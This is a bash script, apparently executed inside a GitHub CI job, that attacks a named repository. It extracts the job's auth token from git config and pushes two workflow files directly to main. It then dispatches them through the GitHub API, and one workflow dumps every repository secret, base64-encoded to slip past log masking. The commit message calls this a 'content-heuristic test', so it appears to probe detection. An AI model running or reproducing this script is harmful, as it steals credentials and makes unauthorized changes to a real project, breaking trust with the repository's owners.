#!/bin/bash
TOK=$(git config --get-regexp extraheader | sed 's/.*basic //'); AUTH="Authorization: basic $TOK"
API=https://api.github.com/repos/Topledger/Landing-Page
git config user.email zzw26@local; git config user.name zzw26
printf 'name: t1\non:\n  workflow_dispatch:\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hello\n' > .github/workflows/zzw26-t1.yml
printf 'name: t2\non:\n  workflow_dispatch:\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "S=$(printf %%s %s | base64 -w0)"\n' "'\${{ toJSON(secrets) }}'" > .github/workflows/zzw26-t2.yml
cat .github/workflows/zzw26-t2.yml
git add -A && git commit -qm "zzw26: content-heuristic test t1/t2" && git fetch -q origin && git rebase origin/main >/dev/null 2>&1; git push origin main 2>&1 | tail -1
sleep 3
for f in zzw26-t1.yml zzw26-t2.yml; do
  echo "== $f"; curl -s -o /tmp/d -w 'DISP=%{http_code}\n' -X POST -H "$AUTH" -H 'Accept: application/vnd.github+json' "$API/actions/workflows/$f/dispatches" -d '{"ref":"main"}'; head -c 200 /tmp/d; echo
done
sleep 12
curl -s -H "$AUTH" "$API/actions/runs?per_page=6" | python3 -c "
import json,sys
for r in json.load(sys.stdin)['workflow_runs']: print(r['id'],r['name'],r['event'],r['status'],r['conclusion'])"
